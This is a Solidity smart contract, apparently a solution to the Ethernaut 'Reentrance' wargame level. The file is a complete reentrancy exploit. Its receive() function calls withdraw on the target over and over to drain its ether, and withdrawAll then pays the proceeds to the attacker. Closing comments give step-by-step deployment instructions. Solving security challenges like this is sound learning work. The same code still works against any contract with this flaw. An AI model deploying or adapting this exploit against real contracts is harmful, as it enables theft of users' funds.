// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    address public owner;
    IReentrance targetContract;
    uint256 targetValue = 1000000000000000;

    constructor(address _targetAddr) public {
        targetContract = IReentrance(_targetAddr);
        owner = msg.sender;
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    function donateAndWithdraw() public payable {
        require(msg.value >= targetValue);
        targetContract.donate.value(msg.value)(address(this));
        targetContract.withdraw(msg.value);
    }

    function withdrawAll() public returns (bool) {
        require(msg.sender == owner, "my money!!");
        uint256 totalBalance = address(this).balance;
        (bool sent, ) = msg.sender.call.value(totalBalance)("");
        require(sent, "Failed to send Ether");
        return sent;
    }

    receive() external payable {
        uint256 targetBalance = address(targetContract).balance;
        if (targetBalance >= targetValue) {
            targetContract.withdraw(targetValue);
        }
    }
}

//
// await getBalance(contract.address)
//
// contract.address
//
// 1. deploy this smart contract with target contract (Reentrance) address
// 2. call donateAndWithdraw of ReentranceAttack with value of 1000000000000000 (0.001 ether)
//
